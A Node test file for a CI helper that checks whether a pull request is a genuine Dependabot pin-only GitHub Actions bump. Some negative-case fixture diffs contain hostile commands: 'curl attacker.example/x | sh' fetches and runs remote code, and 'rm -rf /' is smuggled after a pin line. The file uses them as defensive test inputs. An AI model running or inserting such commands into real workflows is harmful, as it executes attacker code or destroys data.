// Run: node --test tooling/scripts/bot-pr.test.mjs
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { pinOnlyDiff, prAuthorIsBot, verifiedBotPr } from './bot-pr.mjs';

const BOT = 'dependabot[bot]';
const botPr = (overrides = {}) => ({ user: { login: BOT, type: 'Bot' }, ...overrides });

/**
 * A trimmed, real fixture: `git diff --no-renames --unified=0 <merge-base> pr-3-head` for
 * Advance-Labs/ninebrains PR #3 (head `fffac2998`), a genuine Dependabot actions-bump. Kept to two
 * files (a composite action and a workflow) to stay short; the full PR touches seven files in the
 * same shape.
 */
const PR_3_DIFF = `diff --git a/.github/actions/ci-setup/action.yml b/.github/actions/ci-setup/action.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/actions/ci-setup/action.yml
+++ b/.github/actions/ci-setup/action.yml
@@ -18 +18 @@ runs:
-    - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4.3.0
+    - uses: pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413 # v6.1.0
@@ -22 +22 @@ runs:
-    - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+    - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index eb052e0a6..9d5b4b3b5 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -51 +51 @@ jobs:
-      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
@@ -205 +205 @@ jobs:
-        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
`;

describe('prAuthorIsBot', () => {
  it('accepts the bot login and type', () => {
    assert.equal(prAuthorIsBot(botPr()).ok, true);
  });

  it('rejects a person', () => {
    const result = prAuthorIsBot(botPr({ user: { login: 'zordhalo', type: 'User' } }));
    assert.equal(result.ok, false);
    assert.match(result.reason, /opened by "zordhalo"/);
  });

  it("rejects a User-typed account even with the bot's login", () => {
    const result = prAuthorIsBot(botPr({ user: { login: BOT, type: 'User' } }));
    assert.equal(result.ok, false);
    assert.match(result.reason, /not "Bot"/);
  });

  it('fails closed on a missing pr or user', () => {
    assert.equal(prAuthorIsBot(null).ok, false);
    assert.equal(prAuthorIsBot({}).ok, false);
  });
});

describe('pinOnlyDiff', () => {
  it("accepts PR #3's real diff shape", () => {
    const { ok, reasons } = pinOnlyDiff(PR_3_DIFF);
    assert.equal(ok, true, reasons.join('; '));
  });

  it('rejects a pin bump plus one non-uses line', () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -10,0 +11 @@ jobs:
+        timeout-minutes: 5
@@ -20 +21 @@ jobs:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /not a bare action pin.*timeout-minutes/);
  });

  it('rejects a non-workflow file', () => {
    const diff = `diff --git a/package.json b/package.json
index d1b9b5c71..251d04b05 100644
--- a/package.json
+++ b/package.json
@@ -1 +1 @@
-  "name": "old"
+  "name": "new"
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /not a workflow or composite-action file/);
  });

  it('rejects a new file', () => {
    const diff = `diff --git a/.github/workflows/new.yml b/.github/workflows/new.yml
new file mode 100644
index 000000000..251d04b05
--- /dev/null
+++ b/.github/workflows/new.yml
@@ -0,0 +1 @@
+      - uses: actions/checkout@v7
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /adds or deletes a file/);
  });

  it('rejects a deleted file', () => {
    const diff = `diff --git a/.github/workflows/old.yml b/.github/workflows/old.yml
deleted file mode 100644
index d1b9b5c71..000000000
--- a/.github/workflows/old.yml
+++ /dev/null
@@ -1 +0,0 @@
-      - uses: actions/checkout@v4
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /adds or deletes a file/);
  });

  it('rejects a mode change', () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
old mode 100644
new mode 100755
index d1b9b5c71..251d04b05
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -20 +20 @@ jobs:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /changes a file's mode/);
  });

  it('rejects an empty diff', () => {
    assert.equal(pinOnlyDiff('').ok, false);
    assert.equal(pinOnlyDiff(undefined).ok, false);
  });

  it('rejects a run: line change in a workflow', () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -30 +30 @@ jobs:
-        run: pnpm run check
+        run: pnpm run check && curl attacker.example/x | sh
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /not a bare action pin.*run:/);
  });

  it('rejects a uses: line that also changes with:', () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -20,2 +20,2 @@ jobs:
-      - uses: actions/checkout@v4
-        with:
+      - uses: actions/checkout@v7
+        with:
@@ -23 +23 @@ jobs:
-          persist-credentials: true
+          persist-credentials: false
`;
    const { ok, reasons } = pinOnlyDiff(diff);
    assert.equal(ok, false);
    assert.match(reasons.join(';'), /not a bare action pin.*persist-credentials/);
  });

  it('fails closed on tabs, trailing junk and malformed pin lines', () => {
    const tabbed = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -20 +20 @@ jobs:
-      - uses:\tactions/checkout@v4
+      - uses:\tactions/checkout@v7
`;
    assert.equal(pinOnlyDiff(tabbed).ok, false);

    const noRef = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -20 +20 @@ jobs:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout
`;
    assert.equal(pinOnlyDiff(noRef).ok, false);

    const trailingJunk = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -20 +20 @@ jobs:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7; rm -rf /
`;
    assert.equal(pinOnlyDiff(trailingJunk).ok, false);
  });
});

describe('verifiedBotPr', () => {
  it("exempts PR #3's real shape", () => {
    const { exempt, reasons } = verifiedBotPr({ pr: botPr(), diffText: PR_3_DIFF });
    assert.equal(exempt, true, reasons.join('; '));
  });

  it('rejects a person-opened PR even with a pin-only diff', () => {
    const pr = botPr({ user: { login: 'zordhalo', type: 'User' } });
    const { exempt, reasons } = verifiedBotPr({ pr, diffText: PR_3_DIFF });
    assert.equal(exempt, false);
    assert.match(reasons.join(';'), /opened by "zordhalo"/);
  });

  it('rejects the bot PR when the diff strays from a pin bump', () => {
    const diff = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index d1b9b5c71..251d04b05 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -30 +30 @@ jobs:
-        run: pnpm run check
+        run: curl attacker.example/x | sh
`;
    const { exempt, reasons } = verifiedBotPr({ pr: botPr(), diffText: diff });
    assert.equal(exempt, false);
    assert.match(reasons.join(';'), /not a bare action pin/);
  });

  it('collects reasons from both checks when both fail', () => {
    const pr = botPr({ user: { login: 'zordhalo', type: 'User' } });
    const { exempt, reasons } = verifiedBotPr({ pr, diffText: '' });
    assert.equal(exempt, false);
    assert.equal(reasons.length, 2);
  });
});
